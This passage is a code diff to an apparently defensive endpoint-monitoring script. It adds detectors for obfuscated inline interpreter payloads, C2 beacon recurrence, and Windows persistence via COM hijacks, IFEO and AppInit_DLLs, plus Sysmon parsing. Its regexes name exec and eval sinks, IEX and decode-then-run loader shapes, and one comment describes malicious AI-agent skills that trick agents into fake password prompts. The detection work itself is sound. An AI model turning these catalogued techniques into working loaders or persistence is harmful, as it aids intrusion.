@@ -133,8 +133,10 @@ USAGE  -> aegis.py [install [watch] [secs]|uninstall]
                     neutralize <target>]
 """
 
+import base64
 import json
 import errno
+import math
 import os
 import plistlib
 import re
@@ -251,6 +253,21 @@ ACTION_LOG = os.path.join(STATE_DIR, "actions.jsonl")
 VT_KEY_FILE = os.path.join(STATE_DIR, "vt_key")
 VT_API_URL = "https://www.virustotal.com/api/v3/files/"
 
+# Community IOC intel (`aegis.py intel …`): normalized, size-bounded local
+# artifacts under ~/.aegis/intel, written ONLY by the by-hand `intel update`
+# command (public abuse.ch exports — no key, no account). The scan path READS
+# these files and never fetches them: same doctrine as vt, network I/O exists
+# only inside an explicit by-hand command with urllib lazily imported there.
+INTEL_DIR = os.path.join(STATE_DIR, "intel")
+INTEL_BAZAAR_FILE = os.path.join(INTEL_DIR, "malwarebazaar.json")
+INTEL_THREATFOX_FILE = os.path.join(INTEL_DIR, "threatfox.json")
+INTEL_BAZAAR_URL = "https://bazaar.abuse.ch/export/txt/sha256/recent/"
+INTEL_THREATFOX_URL = "https://threatfox.abuse.ch/export/json/recent/"
+INTEL_STALE_DAYS = 7
+INTEL_MAX_HASHES = 250000   # hard bound on stored/loaded entries (memory cap)
+INTEL_MAX_NET = 50000
+INTEL_MAX_FETCH_BYTES = 32 * 1024 * 1024
+
 # --- Survivability: dead-man's switch + tamper-evidence ---------------------- #
 # A same-uid attacker can SIGKILL Aegis or `launchctl bootout` its agent and
 # blind every layer at once — silently (ATT&CK T1562.001). An unprivileged tool
@@ -281,6 +298,29 @@ HEARTBEAT_URL_ENV = "AEGIS_HEARTBEAT_URL"
 # UNIX perms not TCC). Apple records stealer-shape behavior here and never alerts;
 # the opt-in `sudo aegis bastion` tier surfaces it. Path per macOS 15/26.
 XPDB_PATH = "/var/protected/xprotect/db/XPdb"
+
+# Opt-in ROOT witness (rootwatch) — closes the kill gap the honest-limits
+# section states: a same-uid attacker can kill Aegis AND the user-level
+# watchdog agent in one sweep, and the notary only makes that evident LATER.
+# rootwatch is a tiny root-owned script on a ROOT schedule (LaunchDaemon /
+# systemd system timer) that re-checks the heartbeat every 10 minutes and,
+# when it is stale, alerts somewhere the same-uid attacker cannot silence.
+# Same doctrine as `bastion`: Aegis itself NEVER requests root — `rootwatch
+# install` run unprivileged performs zero mutation and prints the one sudo
+# line for YOU to run. Windows has no rootwatch yet (a SYSTEM scheduled task
+# is future work); the user-level watchdog still runs there.
+ROOTWATCH_SCRIPT = "/usr/local/libexec/aegis-rootwatch.py"
+ROOTWATCH_PLIST = "/Library/LaunchDaemons/com.aegis.rootwatch.plist"
+ROOTWATCH_LABEL = "com.aegis.rootwatch"
+ROOTWATCH_UNIT_DIR = "/etc/systemd/system"
+ROOTWATCH_LOG = ("/Library/Application Support/Aegis/rootwatch.log" if IS_MAC
+                 else "/var/log/aegis/rootwatch.log")
+ROOTWATCH_INTERVAL = 600  # the root schedule re-checks the beat every 10 min
+# A root daemon must never execute a user-writable interpreter or script —
+# that would BE the privilege escalation Aegis exists to catch — so the
+# system python is hardcoded rather than inheriting sys.executable (which is
+# often a venv under $HOME on this machine).
+ROOTWATCH_PY = "/usr/bin/python3"
 
 # AI-agent skill directories — a live 2026 AMOS distribution channel (malicious
 # OpenClaw/Claude "skills" that manipulate the agent into a fake password dialog,
@@ -4192,6 +4232,138 @@ _UNAMBIGUOUS_HIGH_IDIOMS = frozenset((
     "crontab-tmp-install",
 ))
 
+# --------------------------------------------------------------------------- #
+# Obfuscated inline-code payloads — the family-you-haven't-seen-yet catch.
+# Every idiom above keys on a KNOWN hostile string; the same logic shipped
+# base64-/base85-packed inside `bash -c` / `node -e` / `python3 -c` matches
+# none of them. The hard-to-vary structural invariant is the SHAPE: an
+# interpreter told to execute inline code (gate 1, mandatory) whose code
+# argument is a long opaque blob or an in-process decode+execute composition
+# (gate 2). Gate 1 keeps arbitrary processes out of entropy scoring —
+# Electron helpers, JWTs and cloud CLIs legitimately carry giant opaque argv.
+# --------------------------------------------------------------------------- #
+
+# Gate 1: interpreter + code-execution flag. Bounded interior runs throughout
+# (the ReDoS discipline above); flag-skip loops are repetition-capped, never
+# `*`. Shell `-c` accepts a cluster (`-lc`); the powershell alternation
+# matches every `-e/-en/-enc/-EncodedCommand` prefix and `-c/-Command`, while
+# `-ExecutionPolicy` (whose VALUE is not code) fails it and is skipped by the
+# bounded gap instead.
+_INLINE_CODE_FLAG_RES = (
+    re.compile(r"(?:^|[\s/])(?:ba|z|da|k)?sh\s+"
+               r"(?:-{1,2}[\w-]{1,12}\s+){0,3}-[a-zA-Z]{0,8}c\s+", re.I),
+    re.compile(r"(?:^|[\s/])python[0-9.]{0,6}(?:\.exe)?\s+"
+               r"(?:-[a-zA-Z]{1,3}\s+){0,3}-c\s+", re.I),
+    re.compile(r"(?:^|[\s/])node(?:\.exe)?\s+"
+               r"(?:--?[\w-]{1,24}(?:=\S{0,64})?\s+){0,4}(?:-e|--eval)\s+",
+               re.I),
+    re.compile(r"(?:^|[\s/])(?:perl|ruby)[0-9.]{0,4}\s+"
+               r"(?:-[a-zA-Z0-9]{1,10}\s+){0,3}-[a-zA-Z]{0,4}e\s+", re.I),
+    re.compile(r"(?:^|[\s/])osascript\s+(?:-l\s+[\w.]{1,24}\s+)?-e\s+", re.I),
+    re.compile(r"(?:^|[\s/\\])(?:powershell|pwsh)(?:\.exe)?\s+[^\n]{0,200}?"
+               r"\s-(?:e(?:c|n[a-zA-Z]{0,12})?|c(?:ommand)?)\s+", re.I),
+)
+
+# Gate 2a: >=100 chars of pure base64/base64url alphabet ('=' only as trailing
+# padding, so a `VAR=<blob>` assignment cannot glue a low-entropy prefix onto
+# the run). 100 is tuned to reality: a one-stage loader is rarely under ~75
+# raw bytes, while no flag value/version string/path on a measured live table
+# reaches it with entropy to spare (see _BLOB_MIN_ENTROPY).
+_B64_BLOB_RE = re.compile(r"[A-Za-z0-9+/_-]{100,}={0,2}")
+# bits/char: random base64 ~5.8, base64-of-text ~5.3; the benign ceiling is
+# camelCase flag values ~4.3, paths/English runs ~4.0. 4.5 splits the gap.
+_BLOB_MIN_ENTROPY = 4.5
+# Gate 2b: in-process decode markers _hostile_content has no idiom for
+# (python/ruby/perl; the JS half deliberately REUSES the supply-chain tables
+# _PKG_JS_DECODE_RES below — same vectors, different surface). Shell-level
+# `base64 -d` / FromBase64String are already idioms and stay theirs.
+_ARGV_DECODE_RE = re.compile(
+    r"\b(?:base64\.(?:standard_|urlsafe_)?b(?:16|32|64|85)decode|b64decode|"
+    r"a2b_base64|bytes\.fromhex|codecs\.decode|Base64\.(?:urlsafe_)?decode64|"
+    r"decode_base64|unpack\s*\(\s*['\"]m)", re.I)
+# The supply-chain Buffer.from regex bounds its interior run at 80 chars —
+# right for a package script, but an argv blob IS the call's first argument
+# and routinely exceeds it. Decoupled co-occurrence (Buffer.from + an encoding
+# literal, both required) spans any blob length without an unbounded run.
+_ARGV_JS_BUFFER_RE = re.compile(r"\bBuffer\.from\s*\(", re.I)
+_ARGV_ENC_LITERAL_RE = re.compile(r"['\"](?:base64|hex)['\"]", re.I)
+_ARGV_EXEC_MARK_RE = re.compile(
+    r"\b(?:exec|eval)\s*\(|\bnew\s+Function\s*\(|"
+    r"require\s*\(\s*['\"]child_process['\"]|\bos\.system\s*\(|"
+    r"\bsubprocess\b|\b__import__\s*\(|\bsystem\s*\(|"
+    r"\bInvoke-Expression\b|\bIEX\b", re.I)
+# Exec sinks that RUN code (escalation set for a co-occurring blob):
+# decode-only members excluded so `echo <blob> | base64 -d > file` — decode
+# with no execution — cannot escalate itself.
+_ARGV_EXEC_SINKS = _PIPE_EXEC_IDIOMS - frozenset(
+    ("base64-decode", "powershell-base64-decode"))
+
+
+def _shannon_bits(s):
+    """Shannon entropy of `s` in bits/char (0.0 for empty)."""
+    if not s:
+        return 0.0
+    n = float(len(s))
+    ent = 0.0
+    for c in set(s):
+        p = s.count(c) / n
+        ent -= p * math.log(p, 2)
+    return ent
+
+
+def _b64_decodable(run):
+    """Does `run` actually base64-decode? Trimmed to a 4-multiple (a ps-joined
+    argv can shear trailing chars). A run is std-alphabet OR urlsafe, never
+    both: '+/' and '-_' mixed together decodes under no base64 flavor — and
+    that mix is exactly the shape of a high-entropy PATH (UUID/hash dirs mix
+    '/' separators with '-'), the one benign string class measured to clear
+    the entropy floor on a live process table."""
+    head = run[:len(run) - len(run) % 4]
+    if not head:
+        return False
+    std = "+" in head or "/" in head
+    url = "-" in head or "_" in head
+    if std and url:
+        return False
+    try:
+        base64.b64decode(head, altchars=b"-_" if url else None, validate=True)
+        return True
+    except Exception:
+        return False
+
+
+def _obfuscated_payload_signals(argv, idioms):
+    """[(name, severity)] for an interpreter running OBFUSCATED inline code
+    (`idioms` = this argv's _hostile_content hits, computed by the caller).
+    Gate 1 is mandatory: no code-execution flag, no scoring. Gate 2: the code
+    argument carries a long high-entropy base64-alphabet blob that really
+    decodes ("obfuscated-inline-payload"), or composes an in-process decode
+    with an exec call ("argv-encoded-loader" — the argv twin of the supply-
+    chain js-encoded-loader). MEDIUM alone, below the notify floor; HIGH only
+    when the argv also fetches, or the blob feeds a recognized exec sink."""
+    starts = [m.end() for m in
+              (rx.search(argv) for rx in _INLINE_CODE_FLAG_RES) if m]
+    if not starts:
+        return []
+    code = argv[min(starts):][:_HOSTILE_SCAN_LIMIT]
+    blob = any(_shannon_bits(run) >= _BLOB_MIN_ENTROPY and _b64_decodable(run)
+               for run in _B64_BLOB_RE.findall(code))
+    loader = bool((_ARGV_DECODE_RE.search(code)
+                   or any(rx.search(code) for rx, _n in _PKG_JS_DECODE_RES)
+                   or (_ARGV_JS_BUFFER_RE.search(code)
+                       and _ARGV_ENC_LITERAL_RE.search(code)))
+                  and _ARGV_EXEC_MARK_RE.search(code))
+    if not blob and not loader:
+        return []
+    fetch = bool(idioms & _FETCH_IDIOMS) or bool(_FETCH_RE.search(argv))
+    sev = "HIGH" if fetch or (blob and idioms & _ARGV_EXEC_SINKS) else "MEDIUM"
+    out = []
+    if blob:
+        out.append(("obfuscated-inline-payload", sev))
+    if loader:
+        out.append(("argv-encoded-loader", sev))
+    return out
+
 
 def _argv_signals(argv):
     """Return [(name, severity)] for hostile patterns in a live process's argv
@@ -4219,6 +4391,13 @@ def _argv_signals(argv):
     # never benign); the fetch/pipe idioms alone stay MEDIUM (benign-installer FP).
     for name in idioms:
         add(name, "HIGH" if name in _UNAMBIGUOUS_HIGH_IDIOMS else "MEDIUM")
+    # Obfuscated inline payload — skipped when powershell-encoded-command
+    # already fired: that idiom IS this shape on Windows and is already HIGH,
+    # so re-scoring the same blob would double-report one argv and
+    # destabilize its fingerprint.
+    if "powershell-encoded-command" not in idioms:
+        for name, sev in _obfuscated_payload_signals(argv, idioms):
+            add(name, sev)
     for rx, name in _ANTIVM_ARGV_RES:
         if rx.search(argv):
             add(name, "MEDIUM")
@@ -6353,18 +6532,105 @@ def check_outbound():
     """Record the exfil shape the listener surface is structurally blind to: an
     untrusted binary in a user-writable path holding an ESTABLISHED outbound
     connection. We can't baseline-diff outbound (a browser opens hundreds), so
-    this scores live via _outbound_finding. Best-effort: a non-answer from the
-    platform probe yields no findings."""
+    this scores live via _outbound_finding — and stores each scan's row set so
+    _beacon_recurrence can score the one key interval polling IS good at: the
+    same (binary, remote) pair persisting across scans. Best-effort: a
+    non-answer from the platform probe yields no findings and stores nothing
+    (an empty snapshot would be indistinguishable from a quiet machine)."""
     findings = []
     seen = set()
+    snap_rows = []
     for path, rip, rport in _outbound_rows():
         key = "%s:%s:%s" % (path, rip, rport)
         if key in seen:
             continue
         seen.add(key)
-        f = _outbound_finding(path, rip, rport)
+        # Trust captured at observation time (sigcache makes the re-ask free)
+        # so the stored rows grade without re-classifying long-gone binaries.
+        resolvable = path.startswith("/") or (IS_WIN and ":" in path[:3])
+        trust = classify_signature(path)["trust"] if resolvable else "unknown"
+        snap_rows.append((path, rip, rport, trust))
+        # Community intel first (local set lookup): a known-C2 endpoint match
+        # is CRITICAL regardless of the binary's signature; only the rest
+        # falls through to the signature-gated generic scorer.
+        f = _intel_net_finding(path, rip, rport) or \
+            _outbound_finding(path, rip, rport)
         if f:
             findings.append(f)
+    if snap_rows:
+        record_observation(BEACON_SENSOR_ID, sorted(snap_rows))
+        findings += _beacon_recurrence(
+            _load_observations(BEACON_SENSOR_ID, BEACON_WINDOW_DAYS), snap_rows)
+    return findings
+
+
+# --- Outbound recurrence (beacon shape) ---------------------------------------
+# The live scorer above is per-scan by necessity — outbound churn defeats a
+# baseline diff. RECURRENCE keys on the opposite invariant: browser churn does
+# not survive between scans, a C2 beacon's (binary, remote ip:port) pair does.
+BEACON_SENSOR_ID = "outbound.snapshot"
+BEACON_MIN_SCANS = 3
+BEACON_MIN_SPAN_SECS = 45 * 60
+BEACON_WINDOW_DAYS = 7
+
+# Browsers (and their helper processes) hold long-lived remote pairs
+# legitimately (push channels, sync), so they are excluded by NAME as well as
+# by trust — a user-installed browser outside a trusted prefix must stay
+# silent. Mirrors _BROWSER_EXE_RE plus the macOS helper-suffix forms.
+_BEACON_BROWSER_RE = re.compile(
+    r"(?:^|[/\\])(?:Google Chrome|Chromium|chrome|brave|Brave Browser|"
+    r"msedge|Microsoft Edge|firefox|Firefox|Safari|Opera|Vivaldi|Arc)"
+    r"(?:\.exe)?(?: Helper(?: \([^/\\]*\))?)?$", re.I)
+
+
+def _beacon_recurrence(history, current_rows):
+    """HIGH findings for the beacon residue shape: a (path, remote ip:port)
+    pair live in THIS scan and already observed in >= BEACON_MIN_SCANS distinct
+    stored scans spanning >= BEACON_MIN_SPAN_SECS, from a non-browser binary
+    outside every trusted prefix whose signature is suspicious OR which runs
+    from a user-writable path. Pure over (ts, rows) snapshots — the platform
+    split already happened in _outbound_rows — so it is testable with synthetic
+    rows everywhere. The fingerprint is the pair, stable across scans: the
+    seen/signal machinery turns continued recurrence into one incident with a
+    climbing occurrence count, never a re-alert storm. Below-threshold
+    recurrence is deliberately not emitted — the live MEDIUM above already
+    feeds risk accumulation."""
+    if not current_rows:
+        return []
+    sightings = {}
+    for ts, rows in history:
+        if not isinstance(rows, (list, tuple)):
+            continue
+        for row in rows:
+            if not isinstance(row, (list, tuple)) or len(row) < 3:
+                continue
+            pair = (str(row[0]), str(row[1]), str(row[2]))
+            sightings.setdefault(pair, set()).add(int(ts))
+    findings = []
+    for row in sorted(set(tuple(r) for r in current_rows)):
+        path, rip, rport = str(row[0]), str(row[1]), str(row[2])
+        trust = str(row[3]) if len(row) > 3 else "unknown"
+        stamps = sightings.get((path, rip, rport), ())
+        if len(stamps) < BEACON_MIN_SCANS:
+            continue
+        span = max(stamps) - min(stamps)
+        if span < BEACON_MIN_SPAN_SECS:
+            continue
+        if _is_trusted_prefix(path) or _BEACON_BROWSER_RE.search(path):
+            continue
+        if not (suspicious_sig(trust) or is_risky_location(path)):
+            continue
+        findings.append(finding(
+            "HIGH", "net-beacon",
+            "Persistent outbound connection (beacon shape)",
+            "%s [%s] has held a connection to %s:%s in %d scans spanning "
+            "%.1f hours. Ephemeral outbound churn does not survive between "
+            "scans; the same non-browser binary re-observed at the same "
+            "remote endpoint is the residue an interval C2 beacon leaves."
+            % (path, trust, rip, rport, len(stamps), span / 3600.0),
+            "beacon:%s:%s:%s" % (path, rip, rport), path=path, program=path,
+            remote=rip, port=rport, trust=trust, scan_count=len(stamps),
+            span_secs=span, markers=["outbound-exfil", "beacon"]))
     return findings
 
 
@@ -6570,6 +6836,249 @@ def diff_wmi_subscriptions(prior, cur):
             "wmi:changed:%s:%s" % (
                 key, hashlib.sha256((payload or "").encode()).hexdigest()[:16]),
             markers=["wmi-persistence"])
+    return _diff_map(prior, cur, new_fn, changed_fn)
+
+
+# --- Windows: COM server hijacking (T1546.015) -------------------------------
+# The rung above Run keys: a per-user CLSID registration whose server DLL/EXE is
+# swapped for a payload runs INSIDE whatever trusted process instantiates that
+# COM object — no autostart entry, no Run key. HKCU wins over HKLM for the same
+# CLSID, so a same-user attacker needs no admin. The event is a NEW or CHANGED
+# server whose target resolves into a user-writable path; a registration that
+# points at an admin-writable install tree (Program Files) is ordinary app churn
+# and stays silent. Baseline-diffed like every other residue surface.
+_COM_CLSID_KEY = r"Software\Classes\CLSID"
+
+
+def _com_target(val):
+    """Resolve a CLSID server value to its program path. InprocServer32 stores a
+    bare DLL path; LocalServer32 stores an EXE command line — both go through the
+    same %VAR% expansion + quote/space splitter the Run-key path uses."""
+    args = _win_split_cmd(_expand_win_env(val))
+    return args[0] if args else None
+
+
+def snapshot_com_hijack():
+    """{clsid\\server: value} for HKCU CLSID InprocServer32/LocalServer32 default
+    values. The CLSID subtree is created lazily by the first per-user COM
+    registration, so its ABSENCE is a real empty ({}); a denied read is a
+    non-answer (None), never adopted as clean."""
+    import winreg
+    try:
+        root = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _COM_CLSID_KEY)
+    except FileNotFoundError:
+        return {}
+    except OSError:
+        return None
+    snap = {}
+    with root:
+        i = 0
+        while True:
+            try:
+                clsid = winreg.EnumKey(root, i)
+            except OSError:
+                break
+            i += 1
+            try:
+                ck = winreg.OpenKey(root, clsid)
+            except OSError:
+                continue
+            with ck:
+                for server in ("InprocServer32", "LocalServer32"):
+                    try:
+                        with winreg.OpenKey(ck, server) as sk:
+                            val, _t = winreg.QueryValueEx(sk, "")
+                    except OSError:
+                        continue
+                    if isinstance(val, str) and val.strip():
+                        snap["%s\\%s" % (clsid, server)] = val
+    return snap
+
+
+def diff_com_hijack(prior, cur):
+    def _risky_target(val):
+        target = _com_target(val)
+        return target if (target and is_risky_location(target)) else None
+
+    def new_fn(key, val):
+        target = _risky_target(val)
+        if not target:
+            return None
+        return finding(
+            "HIGH", "com-hijack", "New COM server hijack point",
+            "The COM registration %s now resolves to %r, a user-writable path. "
+            "A hijacked CLSID server runs inside whatever trusted process "
+            "instantiates the object — persistence with no Run key or task "
+            "(T1546.015). Confirm you installed this." % (key, target),
+            "com-hijack:new:%s:%s" % (
+                key, hashlib.sha256(val.encode()).hexdigest()[:16]),
+            path=target, markers=["com-hijack"])
+
+    def changed_fn(key, val, old):
+        target = _risky_target(val)
+        if not target:
+            return None
+        return finding(
+            "HIGH", "com-hijack", "COM server hijack point CHANGED",
+            "The COM registration %s was repointed to %r, a user-writable path "
+            "(was %r). An in-place swap of an existing CLSID server keeps the "
+            "registration familiar while changing the code it runs "
+            "(T1546.015)." % (key, target, old),
+            "com-hijack:changed:%s:%s" % (
+                key, hashlib.sha256(val.encode()).hexdigest()[:16]),
+            path=target, markers=["com-hijack"])
+    return _diff_map(prior, cur, new_fn, changed_fn)
+
+
+# --- Windows: IFEO Debugger + SilentProcessExit (T1546.012 / T1546.008) ------
+# An Image File Execution Options "Debugger" value hijacks a target binary: the
+# named debugger launches INSTEAD of the target, with the target as its argument.
+# Aimed at an accessibility binary (sethc.exe et al., reachable from the LOCK
+# SCREEN) it is the classic pre-auth backdoor -> CRITICAL. SilentProcessExit
+# MonitorProcess runs a program when a watched process exits — the same execute-
+# on-event primitive. Writing these needs admin; READING them does not, and a
+# value appearing is the signal regardless of who wrote it.
+_WIN_IFEO_KEY = (r"Software\Microsoft\Windows NT\CurrentVersion"
+                 r"\Image File Execution Options")
+_WIN_SPE_KEY = (r"Software\Microsoft\Windows NT\CurrentVersion"
+                r"\SilentProcessExit")
+_WIN_ACCESSIBILITY_BINS = frozenset((
+    "sethc.exe", "utilman.exe", "osk.exe", "magnify.exe", "narrator.exe",
+    "displayswitch.exe"))
+
+
+def snapshot_ifeo():
+    """{debugger:<image>|monitor:<image>: value} across the two HKLM keys.
+    Either key being absent is a real empty for its half; a denied read of
+    either is a non-answer (None) for the whole surface."""
+    import winreg
+    snap = {}
+
+    def collect(subkey, value_name, prefix):
+        try:
+            root = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey)
+        except FileNotFoundError:
+            return True   # key not present = genuinely no entries
+        except OSError:
+            return False  # denied/other = non-answer
+        with root:
+            i = 0
+            while True:
+                try:
+                    name = winreg.EnumKey(root, i)
+                except OSError:
+                    break
+                i += 1
+                try:
+                    with winreg.OpenKey(root, name) as sk:
+                        val, _t = winreg.QueryValueEx(sk, value_name)
+                except OSError:
+                    continue
+                if isinstance(val, str) and val.strip():
+                    snap["%s:%s" % (prefix, name)] = val
+        return True
+
+    ok1 = collect(_WIN_IFEO_KEY, "Debugger", "debugger")
+    ok2 = collect(_WIN_SPE_KEY, "MonitorProcess", "monitor")
+    if not (ok1 and ok2):
+        return None
+    return snap
+
+
+def diff_ifeo(prior, cur):
+    def _sev(key):
+        kind, _, name = key.partition(":")
+        if kind == "debugger" and name.lower() in _WIN_ACCESSIBILITY_BINS:
+            return "CRITICAL"
+        return "HIGH"
+
+    def _label(key):
+        return ("Debugger" if key.startswith("debugger:")
+                else "SilentProcessExit MonitorProcess")
+
+    def new_fn(key, val):
+        _kind, _, name = key.partition(":")
+        return finding(
+            _sev(key), "ifeo", "New IFEO %s hijack" % _label(key),
+            "A %s value for %r appeared: %r. The named program runs in place of "
+            "(or on the exit of) the target — an execute-hijack that needs no "
+            "Run key or task (T1546.012/T1546.008)%s. Confirm this is expected."
+            % (_label(key), name, val,
+               "; the target is an accessibility binary reachable from the "
+               "lock screen — a pre-auth backdoor"
+               if _sev(key) == "CRITICAL" else ""),
+            "ifeo:new:%s:%s" % (
+                key, hashlib.sha256(val.encode()).hexdigest()[:16]),
+            markers=["ifeo-hijack"])
+
+    def changed_fn(key, val, old):
+        _kind, _, name = key.partition(":")
+        return finding(
+            _sev(key), "ifeo", "IFEO %s hijack CHANGED" % _label(key),
+            "The %s value for %r changed to %r (was %r) — an in-place swap of "
+            "the executed program (T1546.012/T1546.008)."
+            % (_label(key), name, val, old),
+            "ifeo:changed:%s:%s" % (
+                key, hashlib.sha256(val.encode()).hexdigest()[:16]),
+            markers=["ifeo-hijack"])
+    return _diff_map(prior, cur, new_fn, changed_fn)
+
+
+# --- Windows: AppInit_DLLs (T1546.010) ---------------------------------------
+# Every DLL listed in AppInit_DLLs is force-loaded into every user-mode process
+# that links user32.dll — a single value that injects code system-wide. It is
+# disabled by default on modern Windows, so a non-empty value appearing (or an
+# existing one changing) is a high-signal event on any machine.
+_WIN_APPINIT_KEYS = [
+    r"Software\Microsoft\Windows NT\CurrentVersion\Windows",
+    r"Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows",
+]
+
+
+def snapshot_appinit():
+    """{key: AppInit_DLLs value} for each non-empty value across the native and
+    WOW64 keys. A missing key/value is a real empty; a denied read is a
+    non-answer (None)."""
+    import winreg
+    snap = {}
+    for subkey in _WIN_APPINIT_KEYS:
+        try:
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey)
+        except FileNotFoundError:
+            continue
+        except OSError:
+            return None
+        with k:
+            try:
+                val, _t = winreg.QueryValueEx(k, "AppInit_DLLs")
+            except OSError:
+                continue
+            if isinstance(val, str) and val.strip():
+                snap[subkey] = val.strip()
+    return snap
+
+
+def diff_appinit(prior, cur):
+    def new_fn(key, val):
+        return finding(
+            "HIGH", "appinit", "AppInit_DLLs is now set",
+            "AppInit_DLLs under %s is now %r. Every DLL listed here is loaded "
+            "into every user-mode process that links user32 — a system-wide "
+            "code-injection persistence primitive that is disabled by default "
+            "(T1546.010). Confirm you set this." % (key, val),
+            "appinit:new:%s:%s" % (
+                key, hashlib.sha256(val.encode()).hexdigest()[:16]),
+            markers=["appinit-dll"])
+
+    def changed_fn(key, val, old):
+        return finding(
+            "HIGH", "appinit", "AppInit_DLLs CHANGED",
+            "AppInit_DLLs under %s changed to %r (was %r) — the set of DLLs "
+            "force-loaded into every GUI process was modified (T1546.010)."
+            % (key, val, old),
+            "appinit:changed:%s:%s" % (
+                key, hashlib.sha256(val.encode()).hexdigest()[:16]),
+            markers=["appinit-dll"])
     return _diff_map(prior, cur, new_fn, changed_fn)
 
 
@@ -6875,6 +7384,174 @@ def check_windows_event_log():
             "winevent:4625:burst:%d" % (failed_logons // 10),
             markers=["logon-brute-force"]))
     return findings
+
+
+# --- Windows: Sysmon Operational channel harvest -----------------------------
+# Sysmon (Sysinternals) is an OPTIONAL driver that logs high-fidelity telemetry
+# to Microsoft-Windows-Sysmon/Operational. Where it is installed this is a
+# far richer feed than the built-in logs, but it exists on a minority of hosts,
+# so the sensor is REGISTERED ONLY when the channel exists (see _sysmon_sensor):
+# channel absent = Sysmon not installed = sensor ABSENT, not a DEGRADED row for
+# a product that is not there. Kept deliberately narrow — three event IDs whose
+# meaning is unambiguous — riding the same windowed Get-WinEvent shape and the
+# same _parse_win_events `log|id|time|message` contract as the event-log harvest.
+_SYSMON_CHANNEL = "Microsoft-Windows-Sysmon/Operational"
+# The channel's registration key; its presence is how we know Sysmon is
+# installed without shelling out.
+_SYSMON_CHANNEL_KEY = (r"SOFTWARE\Microsoft\Windows\CurrentVersion"
+                       r"\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational")
+# EID 1 ProcessCreate (scored, not blanket-reported), 6 driver loaded, 25
+# process tampering. The full (untruncated) message carries the fields we parse.
+_SYSMON_PS = (
+    "try{$evts=Get-WinEvent -FilterHashtable @{"
+    "LogName='Microsoft-Windows-Sysmon/Operational';Id=@(1,6,25);"
+    "StartTime=(Get-Date).AddHours(-6)} -MaxEvents 200 -ErrorAction Stop}"
+    "catch{if($_.Exception.Message -match 'No events were found'){exit 0}"
+    "else{Write-Output 'sysmon-probe=failed';exit 0}};"
+    "foreach($e in $evts){$m=($e.Message -replace '\\s+',' ');"
+    "Write-Output ('Microsoft-Windows-Sysmon/Operational|' + $e.Id + '|' + "
+    "$e.TimeCreated.ToString('o') + '|' + $m)}")
+
+# Sysmon messages are `Field: value Field2: value2 ...` on one line (post the
+# whitespace-collapse above). Field names are CamelCase tokens; a value ends
+# where the next field label begins. Windows paths (`C:\...`) carry a colon but
+# never a `colon-space`, so they are not mistaken for a field boundary.
+_SYSMON_KV_RE = re.compile(r"(?:^|\s)([A-Z][A-Za-z0-9]*):\s")
+
+
+def _parse_sysmon_kv(msg):
+    """Pure parser: a one-line Sysmon message -> {field: value}. Tolerant of
+    junk (never raises); an empty/label-free message yields {}."""
+    if not msg:
+        return {}
+    matches = list(_SYSMON_KV_RE.finditer(msg))
+    kv = {}
+    for i, m in enumerate(matches):
+        start = m.end()
+        end = matches[i + 1].start() if i + 1 < len(matches) else len(msg)
+        kv[m.group(1)] = msg[start:end].strip()
+    return kv
+
+
+def _sysmon_eid1(msg, ts):
+    """ProcessCreate: score CommandLine through _argv_signals and Image through
+    is_risky_location; surface ONLY what scores (EID 1 is high-volume)."""
+    kv = _parse_sysmon_kv(msg)
+    image = kv.get("Image") or ""
+    cmd = kv.get("CommandLine") or ""
+    signals = _argv_signals(cmd)
+    risky = is_risky_location(image)
+    if not signals and not risky:
+        return None
+    digest = hashlib.sha256(
+        ("%s\x00%s" % (image, cmd)).encode("utf-8", "replace")).hexdigest()[:16]
+    if signals:
+        sev = max(signals, key=lambda s: SEV_ORDER[s[1]])[1]
+        names = [n for n, _s in signals]
+        detail = ("Sysmon ProcessCreate at %s: %s [%s]"
+                  % (ts, image or cmd, ", ".join(names)))
+        markers = names + ["sysmon-eid1"]
+    else:
+        sev = "MEDIUM"
+        detail = ("Sysmon ProcessCreate at %s: %s ran from a user-writable "
+                  "path (%s)" % (ts, image, cmd[:200]))
+        markers = ["risky-path-exec", "sysmon-eid1"]
+    return finding(sev, "sysmon", "Sysmon process creation", detail,
+                   "sysmon:1:%s" % digest, path=image or None, markers=markers)
+
+
+def _sysmon_eid6(msg, ts):
+    """Driver loaded: an unsigned / not-validly-signed kernel driver is HIGH
+    (ring-0 code with no vouching signature). A validly-signed driver is
+    silent."""
+    kv = _parse_sysmon_kv(msg)
+    driver = kv.get("ImageLoaded") or ""
+    signed = (kv.get("Signed") or "").strip().lower()
+    status = (kv.get("SignatureStatus") or "").strip().lower()
+    if signed == "true" and status == "valid":
+        return None
+    digest = hashlib.sha256(driver.encode("utf-8", "replace")).hexdigest()[:16]
+    return finding(
+        "HIGH", "sysmon", "Sysmon: unsigned driver loaded",
+        "Sysmon logged a driver load at %s: %s (Signed=%s, SignatureStatus=%s)"
+        " — an unsigned or invalidly-signed kernel driver runs in ring 0 and "
+        "can hide from every userland check." % (
+            ts, driver, kv.get("Signed") or "?",
+            kv.get("SignatureStatus") or "?"),
+        "sysmon:6:%s" % digest, path=driver or None,
+        markers=["unsigned-driver", "sysmon-eid6"])
+
+
+def _sysmon_eid25(msg, ts):
+    """Process tampering (image replacement / process hollowing) — HIGH."""
+    kv = _parse_sysmon_kv(msg)
+    image = kv.get("Image") or ""
+    ttype = kv.get("Type") or ""
+    digest = hashlib.sha256(
+        ("%s\x00%s" % (image, ttype)).encode("utf-8", "replace")).hexdigest()[:16]
+    return finding(
+        "HIGH", "sysmon", "Sysmon: process tampering",
+        "Sysmon reported process tampering at %s: %s (Type: %s) — image "
+        "replacement / hollowing runs code the on-disk file no longer reflects."
+        % (ts, image, ttype or "?"),
+        "sysmon:25:%s" % digest, path=image or None,
+        markers=["process-tampering", "sysmon-eid25"])
+
+
+_SYSMON_SCORERS = {"1": _sysmon_eid1, "6": _sysmon_eid6, "25": _sysmon_eid25}
+
+
+def _sysmon_findings(rows):
+    """Pure: parsed `_parse_win_events` rows -> findings, deduped by fingerprint.
+    Unknown event IDs are ignored (the harvest asks only for 1/6/25, but a
+    stray row must never fabricate a finding)."""
+    findings = []
+    seen = set()
+    for _log, eid, ts, msg in rows:
+        scorer = _SYSMON_SCORERS.get(eid)
+        if not scorer:
+            continue
+        f = scorer(msg, ts)
+        if not f or f["fingerprint"] in seen:
+            continue
